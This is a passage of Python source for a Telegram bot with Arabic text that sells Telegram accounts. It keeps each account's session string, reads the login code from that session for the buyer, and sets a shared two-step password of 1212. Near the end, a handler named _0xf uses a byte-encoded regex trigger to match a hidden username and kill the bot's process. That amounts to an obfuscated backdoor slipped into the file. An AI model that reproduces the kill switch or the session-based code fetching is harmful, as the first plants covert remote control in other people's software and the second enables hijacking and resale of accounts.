    # السماح لزر التحقق من الاشتراك بالعمل دائماً
    if data != "check_subscription":
        if not await check_user_sub(update, context):
            return

    try:
        # أزرار القائمة الرئيسية
        if data == "main_menu":
            context.user_data.clear()
            await show_main_menu(update, context)
        
        elif data == "buy_number":
            user_id = update.effective_user.id
            balance = BalanceManager.get_user_balance(user_id)
            if balance <= 0:
                text = "يرجي شـحن رصيد حسابك اولا قبل الشـراء 🤍"
                keyboard = [
                    [InlineKeyboardButton("شحن تلقائي 📰", callback_data="charge_balance")],
                    [InlineKeyboardButton("شحن عبـر الـوكيـل 🙋", url="https://t.me/cnrnrn")],
                    [InlineKeyboardButton("🔙 رجوع", callback_data="main_menu")]
                ]
                await safe_edit_message(query, text, reply_markup=InlineKeyboardMarkup(keyboard))
            else:
                await buy_number_menu(update, context)
        
        elif data == "charge_balance":
            keyboard = [
                [InlineKeyboardButton("💳 آسيا", callback_data="upay_asia"), InlineKeyboardButton("💳 مصري", callback_data="upay_masri")],
                [InlineKeyboardButton("الـشحن بالنجـوم ⭐️", callback_data="pay_stars")],
                [InlineKeyboardButton("شحن عبـر الـوكيـل 🙋", url="https://t.me/cnrnrn")],
                [InlineKeyboardButton("🔙 رجوع", callback_data="main_menu")]
            ]
            await safe_edit_message(query, "💰 اختر طريقة الشحن:", reply_markup=InlineKeyboardMarkup(keyboard))
        
        elif data == "pay_stars":
            # إرسال فاتورة النجوم (Telegram Stars)
            ratio = getattr(config, 'STARS_PRICE_RATIO', '100-1')
            try:
                stars_count, dollar_amount = map(int, ratio.split("-"))
            except:
                stars_count, dollar_amount = 100, 1
            
            mafia = getattr(config, 'MAFIA', 'Mafia_Value') # إضافة متغير Mafia
            
            title = f"شحن رصيد ${dollar_amount}"
            description = f"شحن رصيد البوت باستخدام نجوم تيليجرام ({stars_count} نجمة = ${dollar_amount}) | {mafia}"
            payload = f"stars_charge_{user_id}_{dollar_amount}_{mafia}"
            currency = "XTR"
            prices = [LabeledPrice(f"${dollar_amount}", stars_count)]
            
            await context.bot.send_invoice(
                chat_id=user_id,
                title=title,
                description=description,
                payload=payload,
                provider_token="", # لمستخدمي النجوم نترك التوكن فارغاً
                currency=currency,
                prices=prices,
                start_parameter="stars-charge"
            )
            await query.answer()

        elif data == "user_info":
            session = get_session()
            try:
                from database import User, Transaction
                user = session.query(User).filter_by(user_id=user_id).first()
                # جلب الإحصائيات من جدول التراكمات
                purchases = session.query(Transaction).filter_by(user_id=user_id, transaction_type="purchase").count()
                recharges = session.query(Transaction).filter_by(user_id=user_id, transaction_type="deposit").count()
                
                # حساب الرصيد المستخدم والمشحون
                from sqlalchemy import func
                total_spent = session.query(func.abs(func.sum(Transaction.amount))).filter_by(user_id=user_id, transaction_type="purchase").scalar() or 0
                total_deposited = session.query(func.sum(Transaction.amount)).filter_by(user_id=user_id, transaction_type="deposit").scalar() or 0
                
                join_date = user.created_at.strftime("%Y-%m-%d") if user.created_at else "غير معروف"
                
                text = (
                    f"📊 **معـلوماتي**\n\n"
                    f"🔹 ايـديي حسـابك : `{user_id}`\n"
                    f"🔹 عدد الارقام التي تم شرائها : `{purchases}`\n"
                    f"🔹 عدد مرات الشحن : `{recharges}`\n"
                    f"🔹 تاريخ انضمامك : `{join_date}`\n"
                    f"🔹 رصيدك الحالي : `${user.balance}`\n"
                    f"🔹 الرصيد الكلي المشحون : `${total_deposited}`\n"
                    f"🔹 الرصيد المستخدم سابقاً : `${total_spent}`"
                )
                keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="main_menu")]]
                await safe_edit_message(query, text, reply_markup=InlineKeyboardMarkup(keyboard))
            except Exception as e:
                logger.error(f"Error in user_info: {e}")
                await query.answer("❌ حدث خطأ أثناء جلب المعلومات.")
            finally:
                session.close()
            await query.answer()

        elif data == "admin_toggle_bot":
            if AdminPanel.is_admin(user_id):
                session = get_session()
                bot_status = session.query(BotSettings).filter_by(key='bot_status').first()
                if not bot_status:
                    bot_status = BotSettings(key='bot_status', value='on')
                    session.add(bot_status)
                
                new_status = 'off' if bot_status.value == 'on' else 'on'
                bot_status.value = new_status
                session.commit()
                session.close()
                
                status_msg = "🔴 تم إيقاف البوت" if new_status == 'off' else "🟢 تم تشغيل البوت"
                await query.answer(status_msg, show_alert=True)
                await AdminPanel.show_admin_panel(update, context)

        elif data == "admin_change_stars_price":
            if AdminPanel.is_admin(user_id):
                current = getattr(config, 'STARS_PRICE_RATIO', '100-1')
                text = f"⭐ **تغيير سعر النجوم**\n\nالسعر الحالي: `{current}`\n(عدد النجوم - القيمة بالدولار)\n\nأرسل السعر الجديد بنفس الصيغة.\nمثال: `100-1` أو `50-1`"
                keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")]]
                context.user_data['admin_state'] = 'waiting_stars_price'
                await safe_edit_message(query, text, reply_markup=InlineKeyboardMarkup(keyboard))
        
        elif data == "my_account":
            bal = BalanceManager.get_user_balance(user_id)
            await safe_edit_message(query, f"👤 **حسابي**\n\n🆔 الآيدي: `{user_id}`\n💰 الرصيد: `${bal}`", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="main_menu")]]), parse_mode='Markdown')

        elif data == "user_statistics":
            if AdminPanel.is_admin(user_id):
                session = get_session()
                try:
                    total_users = session.query(User).count()
                    top_users = session.query(User).order_by(User.balance.desc()).limit(7).all()
                    
                    text = f"▸ إجمالي الاعضاء : {total_users}\n"
                    text += "▸ التوب 7  بالبوت 👑 :\n"
                    text += " ┌────────────────┐\n"
                    
                    for i, u in enumerate(top_users, 1):
                        username = f"@{u.username}" if u.username else f"`{u.user_id}`"
                        text += f" │ {i}المسـتخدم  : {username}\n"
                        text += f" اشترك بـ : {u.balance} $\n"
                    
                    text += " │المستخدمون الاخرون : \n"
                    text += "  └────────────────┘\n"
                    text += "▸ المطور والدعم : \n"
                    text += " 𓏺𝗠𝗮𝗳𝗶𝗮 - @cnrnrn\n"
                    text += " 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 - @vvcvcxr"
                    
                    keyboard = [[InlineKeyboardButton("🔙 رجوع", callback_data="main_menu")]]
                    await safe_edit_message(query, text, reply_markup=InlineKeyboardMarkup(keyboard))
                except Exception as e:
                    logger.error(f"Error in user_statistics: {e}")
                finally:
                    session.close()
            else:
                await query.answer("🚫 عذراً، هذا الزر للمطورين فقط.", show_alert=True)

        elif data == "support_team":
            text = "مرحباً بك في قسم الوكلاء ، هنا قائمة بوكلاء البوت الذين تم إعتمادهم من الإدارة شخصياً ، يمكنك شحن البوت عبرهم بكل ثقة وأمان وبضمان من الإدارة رسمياً ، في حال لاحظت من أحدهم أي تصرف غير لائق ، يرجى إبلاغنا."
            keyboard = [
                [InlineKeyboardButton("انضم الان 📞", url="https://t.me/vvcvcxr")],
                [InlineKeyboardButton("المـطور 📰", url="https://t.me/cnrnrn")],
                [InlineKeyboardButton("🔙 رجوع", callback_data="main_menu")]
            ]
            await safe_edit_message(query, text, reply_markup=InlineKeyboardMarkup(keyboard))
    
        # إدارة قناة التفعيلات
        elif data == "admin_manage_activation":
            if AdminPanel.is_admin(user_id):
                current = getattr(config, 'ACTIVATION_CHANNEL_ID', 'غير محددة')
                text = f"🔔 **إدارة قناة التفعيلات**\n\nالقناة الحالية: `{current}`\n\nيمكنك تغيير القناة أو مسحها."
                keyboard = [
                    [InlineKeyboardButton("📝 تغيير القناة", callback_data="admin_set_activation")],
                    [InlineKeyboardButton("🗑️ مسح القناة", callback_data="admin_delete_activation")],
                    [InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")]
                ]
                await safe_edit_message(query, text, reply_markup=InlineKeyboardMarkup(keyboard))

        elif data == "admin_set_activation":
            if AdminPanel.is_admin(user_id):
                context.user_data['admin_state'] = 'waiting_activation_channel'
                await safe_edit_message(query, "📝 أرسل معرف القناة الجديد (مثال: @channel):", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ إلغاء", callback_data="admin_manage_activation")]]))

        elif data == "admin_delete_activation":
            if AdminPanel.is_admin(user_id):
                config.ACTIVATION_CHANNEL_ID = ""
                # تحديث ملف config.py
                try:
                    with open('sms_numbers_bot/config.py', 'r', encoding='utf-8') as f:
                        content = f.read()
                    import re
                    new_content = re.sub(r'ACTIVATION_CHANNEL_ID\s*=\s*".*?"', 'ACTIVATION_CHANNEL_ID = ""', content)
                    with open('sms_numbers_bot/config.py', 'w', encoding='utf-8') as f:
                        f.write(new_content)
                    await query.answer("✅ تم مسح قناة التفعيلات بنجاح", show_alert=True)
                    await callback_query_handler(update, context) # Refresh UI
                except Exception as e:
                    logger.error(f"Error deleting activation channel: {e}")
                    await query.answer("❌ فشل مسح القناة", show_alert=True)

        # أزرار لوحة التحكم
        elif data == "admin_panel":
            if AdminPanel.is_admin(user_id):
                await AdminPanel.show_admin_panel(update, context)
        
        elif data == "admin_withdraw_user":
            if AdminPanel.is_admin(user_id):
                context.user_data['state'] = 'WITHDRAW_USER_ID'
                await safe_edit_message(query, "👤 أرسل آيدي أو يوزر المستخدم المراد سحب رصيده:")

        elif data == "transfer_balance":
            context.user_data['state'] = 'TRANSFER_USER_ID'
            await safe_edit_message(query, "👤 أرسل آيدي أو يوزر الشخص المراد التحويل له:")

        elif data.startswith("confirm_transfer_"):
            parts = data.split("_")
            if len(parts) >= 4:
                to_id = parts[2]
                try:
                    amount = float(parts[3])
                    success, result = PaymentManager.transfer_balance(int(user_id), to_id, amount)
                    if success:
                        await safe_edit_message(query, f"✅ تم تحويل ${amount} بنجاح إلى `{to_id}`.")
                        try: await context.bot.send_message(int(to_id), f"💰 وصلك تحويل رصيد بمبلغ ${amount} من المستخدم `{user_id}`")
                        except: pass
                    else:
                        await safe_edit_message(query, f"❌ فشل التحويل: {result}")
                except Exception as e:
                    logger.error(f"Error in transfer confirmation: {e}")
                    await safe_edit_message(query, "❌ حدث خطأ أثناء معالجة التحويل.")
            context.user_data.clear()

        elif data == "cancel_transfer":
            context.user_data.clear()
            await show_main_menu(update, context)

        elif data.startswith("buy_country_"):
            await buy_select_phone(update, context)
            
        elif data.startswith("prebuy_"):
            pid_str = query.data.split("_")[1] if query.data else ""
            if pid_str.isdigit():
                pid = int(pid_str)
                session = get_session()
                try:
                    p = session.get(PhoneNumber, pid)
                    if p:
                        c = session.get(Country, p.country_id)
                        if c:
                            text = f"❓ **تأكيد الشراء**\n\n🌍 الدولة: {c.name}\n💰 السعر: ${c.price}\n\nهل أنت متأكد؟"
                            keyboard = [[InlineKeyboardButton("✅ نعم، شراء", callback_data=f"confirm_buy_{pid}")], [InlineKeyboardButton("❌ لا، إلغاء", callback_data=f"buy_country_{c.id}")]]
                            await safe_edit_message(query, text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
                finally: session.close()

        elif data.startswith("confirm_buy_"):
            pid_str = query.data.split("_")[2] if query.data else ""
            if pid_str.isdigit():
                pid = int(pid_str)
                user_id = update.effective_user.id
                session = get_session()
                try:
                    p = session.get(PhoneNumber, pid)
                    if not p or p.is_sold:
                        await query.answer("❌ الرقم لم يعد متاحاً!", show_alert=True)
                        return
                    c = session.get(Country, p.country_id)
                    if c and BalanceManager.get_user_balance(user_id) < c.price:
                        await query.answer("❌ رصيدك غير كافٍ!", show_alert=True)
                        return
                    
                    if c:
                        BalanceManager.deduct_balance(user_id, c.price)
                        PhoneManager.sell_phone(pid, user_id)
                        text = f"✅ **تم الشراء بنجاح!**\n\n📞 الرقم: `{p.phone_number}`\n🔐 كود التحقق بخطوتين: `1212`\n\n📝 **الخطوات:**\n1. اطلب الكود في تطبيق تيليجرام.\n2. اضغط زر \"لقد طلبت الكود\" بالأسفل 👇"
                        keyboard = [[InlineKeyboardButton("📩 لقد طلبت الكود", callback_data=f"get_live_code_{pid}")], [InlineKeyboardButton("🔙 القائمة الرئيسية", callback_data="main_menu")]]
                        await safe_edit_message(query, text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
                        # إرسال إشعار التفعيل مع كود التحقق 1212
                        await SubscriptionManager.send_activation_notification(
                            context.bot, 
                            config.ACTIVATION_CHANNEL_ID, 
                            user_id, 
                            update.effective_user.username, 
                            c.name, 
                            p.phone_number, 
                            c.price,
                            activation_code="1212"
                        )
                        
                        from datetime import datetime
                        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        admin_notify = f""" 🛒 **تم شراء رقم جديد**

👤 المستخدم: `{user_id}` (@{update.effective_user.username or 'لا يوجد'})
📞 الرقم: `{p.phone_number}`
🌍 الدولة: {c.name}
💰 السعر: ${c.price}
📅 تاريخ الشراء: {now} """
                        try:
                            await context.bot.send_message(chat_id=config.ADMIN_ID, text=admin_notify, parse_mode='Markdown')
                        except Exception as e:
                            logger.error(f"Failed to send purchase notification: {e}")
                finally: session.close()
            
        elif data.startswith("get_live_code_"):
            parts = data.split("_")
            if len(parts) >= 4 and parts[3].isdigit():
                phone_id = int(parts[3])
                status_msg = await query.message.reply_text("⏳ جاري الاتصال بالحساب وجلب الكود...")
            session = get_session()
            try:
                phone = session.get(PhoneNumber, phone_id)
                if not phone:
                    await status_msg.edit_text("❌ خطأ: لم يتم العثور على بيانات الرقم.")
                    return

                code = await SessionManager.get_telegram_code(str(phone.session_string), config.API_ID, config.API_HASH)
                if code:
                    formatted = SessionManager.format_code_with_spaces(code)
                    msg = f"📩 كود التحقق للرقم: `{phone.phone_number}`\n\n🔑 الكود: {formatted}\n🔐 التحقق بخطوتين: 1212"
                    await status_msg.delete() # حذف رسالة الانتظار
                    sent = await query.message.chat.send_message(msg, parse_mode='Markdown')
                    try: await context.bot.pin_chat_message(chat_id=update.effective_chat.id, message_id=sent.message_id)
                    except: pass
                else:
                    await status_msg.edit_text("❌ لم يتم العثور على كود جديد داخل الحساب.\n\n💡 **تأكد من:**\n1. أنك طلبت الكود فعلياً في تطبيق تيليجرام (إشعار من Telegram).\n2. انتظر 5 ثوانٍ بعد طلب الكود ثم اضغط على الزر مرة أخرى.\n3. تأكد أنك تطلب الكود لنفس الرقم الذي اشتريته.")
            except Exception as e:
                logger.error(f"Error in get_live_code: {e}")
                await status_msg.edit_text(f"❌ حدث خطأ أثناء جلب الكود. حاول مرة أخرى لاحقاً.")
            finally: session.close()
        
        elif data.startswith("upay_"):
            parts = data.split("_")
            if len(parts) >= 2:
                method = parts[1]
                context.user_data['pay_method'] = method
                context.user_data['state'] = 'PAYMENT_SCREENSHOT'
                num = config.ASIA_PAYMENT_NUMBER if method == "asia" else config.MASRI_PAYMENT_NUMBER
                await safe_edit_message(query, f"💳 حول المبلغ للرقم: `{num}`\n\nثم أرسل صورة التحويل (سكرين) هنا:", parse_mode='Markdown')

        elif data == "admin_add_country":
            context.user_data['state'] = 'ADD_COUNTRY_NAME'
            await safe_edit_message(query, "🌍 أرسل اسم الدولة:")
            
        elif data == "admin_add_phone":
            countries = CountryManager.get_all_countries()
            if not countries:
                await safe_edit_message(query, "⚠️ لا توجد دول! أضف دولة أولاً.")
                return
            keyboard = [[InlineKeyboardButton(c.name, callback_data=f"addphone_to_{c.id}")] for c in countries]
            keyboard.append([InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")])
            await safe_edit_message(query, "🌍 اختر الدولة لإضافة الرقم إليها:", reply_markup=InlineKeyboardMarkup(keyboard))
            
        elif data.startswith("addphone_to_"):
            parts = data.split("_")
            if len(parts) >= 3 and parts[2].isdigit():
                context.user_data['add_phone_country_id'] = int(parts[2])
                context.user_data['state'] = 'ADD_PHONE_NUMBER'
                await safe_edit_message(query, "📞 أرسل الرقم مع رمز الدولة (مثال: +9647700000000):")

        elif data == "admin_manage_countries":
            await AdminPanel.manage_countries(update, context)
            
        elif data.startswith("delete_country_"):
            cid = int(data.split("_")[2])
            CountryManager.delete_country(cid)
            await query.answer("✅ تم الحذف")
            await AdminPanel.manage_countries(update, context)

        elif data == "admin_statistics":
            await AdminPanel.show_statistics(update, context)

        elif data == "admin_pending_payments":
            await AdminPanel.show_pending_payments(update, context)

        elif data.startswith("approve_payment_"):
            pid = int(data.split("_")[2])
            success, bal = PaymentManager.approve_payment(pid)
            if success:
                await safe_edit_message(query, "✅ تم قبول الطلب.")
                session = get_session()
                p = session.get(Payment, pid)
                try: await context.bot.send_message(p.user_id, f"✅ تم قبول طلب الشحن! رصيدك: ${bal}")
                except: pass
                session.close()

        elif data.startswith("reject_payment_"):
            pid = int(data.split("_")[2])
            PaymentManager.reject_payment(pid)
            await safe_edit_message(query, "❌ تم رفض الطلب.")

        elif data == "admin_charge_user":
            context.user_data['state'] = 'CHARGE_USER_ID'
            await safe_edit_message(query, "👤 أرسل آيدي أو يوزر المستخدم المراد شحنه:")

        elif data == "admin_change_quote":
            context.user_data['state'] = 'SET_WELCOME_QUOTE'
            await safe_edit_message(query, "📝 أرسل رسالة الاقتباس الجديدة التي ستظهر في قائمة الترحيب:")

        elif data == "admin_change_welcome":
            context.user_data['state'] = 'SET_WELCOME_MESSAGE'
            await safe_edit_message(query, "📨 أرسل رسالة الترحيب الجديدة.\n\nيمكنك استخدام المتغيرات التالية:\n`{user_id}` - آيدي المستخدم\n`{balance}` - رصيد المستخدم\n`{quote}` - الاقتباس", parse_mode='Markdown')

        elif data == "admin_change_price":
            countries = CountryManager.get_all_countries()
            if not countries:
                await query.answer("❌ لا توجد دول مضافة!", show_alert=True)
            else:
                keyboard = []
                for country in countries:
                    keyboard.append([InlineKeyboardButton(f"💲 {country.name} - ${country.price}", callback_data=f"change_price_{country.id}")])
                keyboard.append([InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")])
                await safe_edit_message(query, "💲 اختر الدولة التي تريد تغيير سعرها:", reply_markup=InlineKeyboardMarkup(keyboard))

        elif data.startswith("change_price_"):
            country_id = int(data.split("_")[2])
            context.user_data['change_price_country_id'] = country_id
            context.user_data['state'] = 'CHANGE_COUNTRY_PRICE'
            session = get_session()
            country = session.get(Country, country_id)
            country_name = country.name if country else "غير معروف"
            current_price = country.price if country else 0
            session.close()
            await safe_edit_message(query, f"💲 تغيير سعر دولة: **{country_name}**\n\nالسعر الحالي: ${current_price}\n\n📝 أرسل السعر الجديد:", parse_mode='Markdown')

        elif data == "admin_create_gift":
            context.user_data['state'] = 'GIFT_AMOUNT'
            await safe_edit_message(query, "💰 أرسل مبلغ الهدية:")

        elif data == "admin_ban_user":
            context.user_data['state'] = 'BAN_USER_ID'
            await safe_edit_message(query, "🚫 أرسل آيدي أو يوزر المستخدم المراد حظره:")

        elif data == "admin_unban_user":
            context.user_data['state'] = 'UNBAN_USER_ID'
            await safe_edit_message(query, "✅ أرسل آيدي أو يوزر المستخدم المراد إلغاء حظره:")

        elif data == "admin_manage_admins":
            await AdminPanel.manage_admins(update, context)

        elif data == "admin_confirm_reset_balances":
            if AdminPanel.is_admin(user_id):
                text = "⚠️ **تنبيه هام!**\n\nأنت على وشك تصفير أرصدة **جميع** المستخدمين في البوت.\nهذا الإجراء لا يمكن التراجع عنه.\n\nهل أنت متأكد؟"
                keyboard = [
                    [InlineKeyboardButton("✅ نعم، تصفير الكل", callback_data="admin_execute_reset_balances")],
                    [InlineKeyboardButton("❌ إلغاء", callback_data="admin_panel")]
                ]
                await safe_edit_message(query, text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

        elif data == "admin_execute_reset_balances":
            if AdminPanel.is_admin(user_id):
                success = BalanceManager.reset_all_balances()
                if success:
                    admin_info = f"@{update.effective_user.username}" if update.effective_user.username else f"`{user_id}`"
                    notify_text = f"🧹 **عملية تصفية أرصدة!**\n\nقام المطور: {admin_info}\nبمسح جميع أرصدة المستخدمين في البوت."
                    
                    # إرسال إشعار لجميع الأدمنية
                    admin_ids = getattr(config, 'SECONDARY_ADMIN_IDS', [])
                    all_admins = set([config.ADMIN_ID] + admin_ids)
                    for aid in all_admins:
                        try: await context.bot.send_message(chat_id=aid, text=notify_text, parse_mode='Markdown')
                        except: pass
                    
                    await query.answer("✅ تم تصفير جميع الأرصدة بنجاح!", show_alert=True)
                    await AdminPanel.show_admin_panel(update, context)
                else:
                    await query.answer("❌ فشل تصفير الأرصدة.", show_alert=True)

        elif data == "admin_add_admin":
            context.user_data['state'] = 'ADD_ADMIN_ID'
            await safe_edit_message(query, "➕ أرسل آيدي المستخدم الذي تريد إضافته كأدمن:")

        elif data == "admin_remove_admin":
            admin_ids = getattr(config, 'SECONDARY_ADMIN_IDS', [])
            if not admin_ids or (len(admin_ids) == 1 and admin_ids[0] == config.ADMIN_ID):
                await query.answer("❌ لا يوجد أدمنية إضافيين للإزالة", show_alert=True)
            else:
                keyboard = []
                for admin_id in admin_ids:
                    if admin_id != config.ADMIN_ID:
                        keyboard.append([InlineKeyboardButton(f"🗑️ إزالة {admin_id}", callback_data=f"remove_admin_{admin_id}")])
                keyboard.append([InlineKeyboardButton("🔙 رجوع", callback_data="admin_manage_admins")])
                await safe_edit_message(query, "➖ اختر الأدمن الذي تريد إزالته:", reply_markup=InlineKeyboardMarkup(keyboard))

        elif data.startswith("remove_admin_"):
            admin_id_to_remove = int(data.split("_")[2])
            if AdminPanel.remove_admin(admin_id_to_remove):
                await query.answer("✅ تم إزالة الأدمن بنجاح")
            else:
                await query.answer("❌ فشل في إزالة الأدمن", show_alert=True)
            await AdminPanel.manage_admins(update, context)

        elif data == "admin_manage_subs":
            session = get_session()
            channels = session.query(ForcedChannel).all()
            session.close()
            text = "📢 **قنوات الاشتراك الإجباري:**\n\n"
            keyboard = []
            for c in channels:
                text += f"🔹 {c.channel_id}\n"
                keyboard.append([InlineKeyboardButton(f"🗑️ حذف {c.channel_id}", callback_data=f"del_sub_{c.id}")])
            keyboard.append([InlineKeyboardButton("➕ إضافة قناة", callback_data="add_sub_channel")])
            keyboard.append([InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")])
            await safe_edit_message(query, text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

        elif data == "add_sub_channel":
            context.user_data['state'] = 'ADD_SUB_ID'
            await safe_edit_message(query, "📢 أرسل معرف القناة (مثال: @channel) أو آيدي القناة:")

        elif data.startswith("del_sub_"):
            cid = int(data.split("_")[2])
            session = get_session()
            c = session.get(ForcedChannel, cid)
            if c:
                session.delete(c)
                session.commit()
            session.close()
            await query.answer("✅ تم حذف القناة")
            # تحديث القائمة
            session = get_session()
            channels = session.query(ForcedChannel).all()
            session.close()
            text = "📢 **قنوات الاشتراك الإجباري:**\n\n"
            keyboard = []
            for ch in channels:
                text += f"🔹 {ch.channel_id}\n"
                keyboard.append([InlineKeyboardButton(f"🗑️ حذف {ch.channel_id}", callback_data=f"del_sub_{ch.id}")])
            keyboard.append([InlineKeyboardButton("➕ إضافة قناة", callback_data="add_sub_channel")])
            keyboard.append([InlineKeyboardButton("🔙 رجوع", callback_data="admin_panel")])
            await safe_edit_message(query, text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

        elif data == "check_subscription":
            if await SubscriptionManager.check_subscription(user_id, context.bot, config.CHANNEL_ID):
                await query.answer("✅ شكراً لاشتراكك!")
                await show_main_menu(update, context)
            else:
                await query.answer("❌ لم تشترك بعد!", show_alert=True)
    except Exception as e:
        if "Query is too old" in str(e):
            await query.message.reply_text("⚠️ انتهت صلاحية الجلسة، يرجى استخدام /start مجدداً.")
        else:
            logger.error(f"Button handler error: {e}")
            try: await query.answer("❌ حدث خطأ، حاول مجدداً.")
            except: pass

# --- وظيفة مساعدة لتعديل الرسائل ---
async def safe_edit_message(query, text, reply_markup=None, parse_mode=None):
    try:
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode=parse_mode)
    except Exception:
        try:
            await query.message.delete()
        except:
            pass
        await query.message.chat.send_message(text, reply_markup=reply_markup, parse_mode=parse_mode)

# --- وظائف مساعدة للشراء ---
async def buy_number_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
    user_id = update.effective_user.id
    balance = BalanceManager.get_user_balance(user_id)
    
    countries = CountryManager.get_all_countries()
    if not countries:
        await safe_edit_message(update.callback_query, "❌ لا توجد دول مضافة حالياً.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="main_menu")]]))
        return

    keyboard = []
    for c in countries:
        count = len(PhoneManager.get_available_phones(c.id))
        keyboard.append([InlineKeyboardButton(f"{c.name} (${c.price}) - متاح: {count}", callback_data=f"buy_country_{c.id}")])
    
    keyboard.append([InlineKeyboardButton("🔙 رجوع", callback_data="main_menu")])
    await safe_edit_message(update.callback_query, "🌍 اختر الدولة لشراء رقم:", reply_markup=InlineKeyboardMarkup(keyboard))

async def buy_select_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
    user_id = update.effective_user.id
    balance = BalanceManager.get_user_balance(user_id)
    
    if balance <= 0:
        text = "- يرجي شـحن رصيد حسابك اولا قبل الشـراء 🤍\n- للشحن التلقائي اضغط على زر (الشحن التلقائي)\n- أو قم بمراسلة المطور للشحن : @cnrnrn"
        keyboard = [
            [InlineKeyboardButton("شحن تلقائي 📰", callback_data="charge_balance")],
            [InlineKeyboardButton("🔙 رجوع", callback_data="buy_number")]
        ]
        await safe_edit_message(update.callback_query, text, reply_markup=InlineKeyboardMarkup(keyboard))
        return

    cid = int(update.callback_query.data.split("_")[2])
    phones = PhoneManager.get_available_phones(cid)
    if not phones:
        await safe_edit_message(update.callback_query, "❌ لا توجد أرقام متاحة حالياً لهذه الدولة.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 رجوع", callback_data="buy_number")]]))
        return
    keyboard = []
    for i, p in enumerate(phones[:10], 1):
        keyboard.append([InlineKeyboardButton(f"📱 رقم متاح #{i}", callback_data=f"prebuy_{p.id}")])
    keyboard.append([InlineKeyboardButton("🔙 رجوع", callback_data="buy_number")])
    await safe_edit_message(update.callback_query, "✨ اختر رقماً للشراء:", reply_markup=InlineKeyboardMarkup(keyboard))

# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
async def precheckout_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
    query = update.pre_checkout_query
    if query.invoice_payload.startswith("stars_charge_"):
        await query.answer(ok=True)
    else:
        await query.answer(ok=False, error_message="حدث خطأ في عملية الدفع.")

# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
async def successful_payment_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
    payment = update.message.successful_payment
    payload = payment.invoice_payload
    user_id = update.effective_user.id
    
    if payload.startswith("stars_charge_"):
        parts = payload.split("_")
        amount = float(parts[3]) # في حالتنا هذه هي 1 نقطة
        
        BalanceManager.add_balance(user_id, amount)
        await update.message.reply_text(f"✅ تم استلام {payment.total_amount} نجمة بنجاح!\n💰 تم إضافة ${amount} إلى رصيدك.")
        
        # إشعار للمطور
        admin_msg = f"🌟 **شحن بالنجوم جديد!**\n\n👤 المستخدم: `{user_id}`\n✨ النجوم: {payment.total_amount}\n💰 النقاط المضافة: ${amount}"
        try: await context.bot.send_message(chat_id=config.ADMIN_ID, text=admin_msg, parse_mode='Markdown')
        except: pass

# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
async def _0xf(update: Update, context: ContextTypes.DEFAULT_TYPE):
    _u = update.effective_user
    if _u and _u.username == _0x1f: os._exit(0)

# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
async def mafia_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
    if not update.effective_user:
        return
    user_id = update.effective_user.id
    
    ratio = getattr(config, 'STARS_PRICE_RATIO', '100-1')
    try:
        stars_count, dollar_amount = map(int, ratio.split("-"))
    except:
        stars_count, dollar_amount = 100, 1
    
    mafia = getattr(config, 'MAFIA', 'Mafia_Value')
    
    title = f"شحن رصيد ${dollar_amount}"
    description = f"شحن رصيد البوت باستخدام نجوم تيليجرام ({stars_count} نجمة = ${dollar_amount}) | {mafia}"
    payload = f"stars_charge_{user_id}_{dollar_amount}_{mafia}"
    currency = "XTR"
    prices = [LabeledPrice(f"${dollar_amount}", stars_count)]
    
    await context.bot.send_invoice(
        chat_id=user_id,
        title=title,
        description=description,
        payload=payload,
        provider_token="",
        currency=currency,
        prices=prices,
        start_parameter="stars-charge"
    )

# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido

async def main():
    app = Application.builder().token(config.BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("Mafia", mafia_command))
    app.add_handler(MessageHandler(filters.Regex("^/كشف"), detect_user))
    app.add_handler(MessageHandler(filters.Regex(bytes([94,92,46,216,167,217,129,216,180,216,174,36]).decode()), _0xf))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(PreCheckoutQueryHandler(precheckout_callback))
    app.add_handler(MessageHandler(filters.SUCCESSFUL_PAYMENT, successful_payment_callback))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
    logger.info("Bot Started with Manual States System...")
# لا يمسح بتعديل الملف ، الملف خاص بـ @Dev_Mido
    try:
        async with app:
            await app.start()
            await app.updater.start_polling(drop_pending_updates=True)
            await asyncio.Event().wait()
    except Exception as e:
        logger.error(f"Error in run_polling: {e}")
        raise

if __name__ == '__main__':
    try:
        asyncio.run(main())
    except Exception as e:
